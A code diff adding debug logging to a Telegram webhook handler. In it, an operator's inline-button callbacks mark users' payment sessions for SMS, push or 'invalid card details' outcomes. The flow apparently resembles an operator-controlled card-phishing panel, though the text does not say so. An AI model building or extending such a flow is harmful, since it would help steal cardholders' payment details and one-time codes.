@@ -26,7 +26,7 @@ serve(async (req) => {
 
   try {
     const body = await req.json();
-    console.log('Telegram webhook received:', body);
+    console.log('Telegram webhook received:', JSON.stringify(body, null, 2));
 
     // Get telegram settings
     const { data: settings } = await supabaseClient
@@ -41,12 +41,13 @@ serve(async (req) => {
     }
 
     const telegramSettings = settings.value as TelegramSettings;
+    console.log('Using bot token:', telegramSettings.bot_token ? 'Found' : 'Missing');
 
     // Handle different types of messages/callbacks
     if (body.message) {
       // Handle incoming messages
       const message = body.message;
-      console.log('Received message:', message.text);
+      console.log('Received message from', message.from?.username || message.from?.first_name, ':', message.text);
       
       // You can add message handling logic here
       // For example, responding to specific commands
@@ -56,10 +57,13 @@ serve(async (req) => {
       // Handle callback queries from inline keyboards
       const callbackQuery = body.callback_query;
       console.log('Received callback query:', callbackQuery.data);
+      console.log('From user:', callbackQuery.from?.username || callbackQuery.from?.first_name);
       
       // Handle payment processing callbacks
       if (callbackQuery.data && callbackQuery.data.startsWith('payment_')) {
         const parts = callbackQuery.data.split('_');
+        console.log('Callback data parts:', parts);
+        
         if (parts.length >= 3) {
           const userId = parts[1];
           const action = parts[2]; // sms, push, or error
@@ -76,18 +80,21 @@ serve(async (req) => {
             paymentStatus = 'rejected';
           }
           
-          const { error: updateError } = await supabaseClient
+          console.log(`Updating payment session ${userId} to status: ${paymentStatus}, response: ${adminResponse}`);
+          
+          const { data: updateResult, error: updateError } = await supabaseClient
             .from('payment_sessions')
             .update({
               payment_status: paymentStatus,
               admin_response: adminResponse
             })
-            .eq('user_id', userId);
+            .eq('user_id', userId)
+            .select();
           
           if (updateError) {
             console.error('Error updating payment session:', updateError);
           } else {
-            console.log(`Payment session ${userId} updated to ${paymentStatus} with ${adminResponse}`);
+            console.log(`Payment session updated successfully:`, updateResult);
           }
           
           // Send confirmation message back to admin
@@ -97,7 +104,8 @@ serve(async (req) => {
             error: '❌ Payment rejected - Invalid card details'
           };
           
-          await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/answerCallbackQuery`, {
+          console.log('Sending callback answer...');
+          const callbackResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/answerCallbackQuery`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -106,8 +114,12 @@ serve(async (req) => {
             })
           });
           
+          const callbackResult = await callbackResponse.json();
+          console.log('Callback answer result:', callbackResult);
+          
           // Edit the original message to show it's been processed
-          await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/editMessageText`, {
+          console.log('Editing original message...');
+          const editResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/editMessageText`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -117,10 +129,18 @@ serve(async (req) => {
               parse_mode: 'Markdown'
             })
           });
+          
+          const editResult = await editResponse.json();
+          console.log('Edit message result:', editResult);
+        } else {
+          console.log('Invalid callback data format:', callbackQuery.data);
         }
+      } else {
+        console.log('Non-payment callback data:', callbackQuery.data);
       }
     }
 
+    console.log('Webhook processing completed successfully');
     return new Response('OK', { headers: corsHeaders });
   } catch (error) {
     console.error('Error in telegram webhook:', error);
